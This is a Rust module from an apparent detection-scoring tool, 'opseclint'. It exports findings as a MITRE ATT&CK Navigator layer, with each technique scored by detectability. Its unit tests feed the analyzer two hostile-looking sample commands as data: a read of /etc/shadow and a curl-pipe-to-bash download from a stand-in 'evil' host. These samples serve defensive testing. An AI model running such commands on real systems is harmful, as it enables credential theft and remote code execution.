//! ATT&CK Navigator layer output. Emits a layer JSON that can be imported at
//! <https://mitre-attack.github.io/attack-navigator/> to visualize, on the MITRE
//! matrix, which techniques an analyzed input touches — scored by detectability
//! (opseclint's 0-100 noise), so louder techniques stand out.

use std::collections::HashMap;

use serde::Serialize;

use crate::model::Report;

#[derive(Serialize)]
pub struct Layer {
    name: String,
    versions: Versions,
    domain: &'static str,
    description: String,
    techniques: Vec<TechniqueEntry>,
    gradient: Gradient,
    #[serde(rename = "sortTechniques")]
    sort_techniques: u8,
    #[serde(rename = "hideDisabled")]
    hide_disabled: bool,
}

#[derive(Serialize)]
struct Versions {
    attack: &'static str,
    navigator: &'static str,
    layer: &'static str,
}

#[derive(Serialize)]
struct TechniqueEntry {
    #[serde(rename = "techniqueID")]
    technique_id: String,
    /// Detectability (0-100). The gradient maps this to a color.
    score: u8,
    /// Empty so the gradient drives the color.
    color: &'static str,
    comment: String,
    enabled: bool,
}

#[derive(Serialize)]
struct Gradient {
    colors: Vec<&'static str>,
    #[serde(rename = "minValue")]
    min_value: u8,
    #[serde(rename = "maxValue")]
    max_value: u8,
}

/// Build a Navigator layer from a report. Findings are aggregated per ATT&CK
/// technique: the score is the loudest (max noise) finding for that technique,
/// and the comment lists every finding that surfaced it.
pub fn build(report: &Report) -> Layer {
    // First-seen technique order, with (max score, comment lines) per technique.
    let mut order: Vec<String> = Vec::new();
    let mut agg: HashMap<String, (u8, Vec<String>)> = HashMap::new();

    for f in &report.findings {
        for t in &f.techniques {
            let slot = agg.entry(t.id.clone()).or_insert_with(|| {
                order.push(t.id.clone());
                (0, Vec::new())
            });
            slot.0 = slot.0.max(f.noise);
            slot.1
                .push(format!("L{} {}: {}", f.line, f.rule_id, f.description));
        }
    }

    let techniques = order
        .iter()
        .map(|id| {
            let (score, comments) = &agg[id];
            TechniqueEntry {
                technique_id: id.clone(),
                score: *score,
                color: "",
                comment: comments.join("\n"),
                enabled: true,
            }
        })
        .collect();

    Layer {
        name: format!("opseclint — {}", report.platform),
        versions: Versions {
            attack: "16",
            navigator: "4.9.5",
            layer: "4.5",
        },
        domain: "enterprise-attack",
        description: format!(
            "opseclint detection-coverage layer ({}). Score = detectability: 0 quiet, 100 loud.",
            report.platform
        ),
        techniques,
        // quiet -> loud: pale yellow through orange to the brand red.
        gradient: Gradient {
            colors: vec!["#fff7b0", "#ffb066", "#f7768e"],
            min_value: 0,
            max_value: 100,
        },
        sort_techniques: 3,
        hide_disabled: false,
    }
}

/// Render a report as an ATT&CK Navigator layer JSON string.
pub fn render(report: &Report) -> String {
    serde_json::to_string_pretty(&build(report))
        .unwrap_or_else(|e| format!("{{\"error\":\"{e}\"}}"))
}

#[cfg(test)]
mod tests {
    use super::*;
    use crate::{analyzer, kb};

    #[test]
    fn navigator_layer_has_expected_shape() {
        let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
        // Two lines touching distinct techniques.
        let report = analyzer::analyze("cat /etc/shadow\nid", &kb);
        let out = render(&report);
        let v: serde_json::Value = serde_json::from_str(&out).unwrap();

        assert_eq!(v["domain"], "enterprise-attack");
        assert_eq!(v["versions"]["layer"], "4.5");
        assert_eq!(v["gradient"]["maxValue"], 100);

        let techs = v["techniques"].as_array().unwrap();
        assert!(!techs.is_empty());
        // shadow-read maps to T1003.008; it must appear with a positive score.
        let shadow = techs
            .iter()
            .find(|t| t["techniqueID"] == "T1003.008")
            .expect("expected the /etc/shadow technique in the layer");
        assert!(shadow["score"].as_u64().unwrap() > 0);
        assert!(shadow["comment"].as_str().unwrap().contains("shadow-read"));
    }

    #[test]
    fn aggregates_max_score_per_technique() {
        let kb = kb::load(kb::Platform::LinuxAuditd).unwrap();
        let report = analyzer::analyze("curl http://evil/x.sh | bash", &kb);
        let layer = build(&report);
        // Every technique's score equals the loudest finding that surfaced it,
        // so no score exceeds the report's max noise.
        for t in &layer.techniques {
            assert!(t.score <= report.max_noise);
        }
    }
}
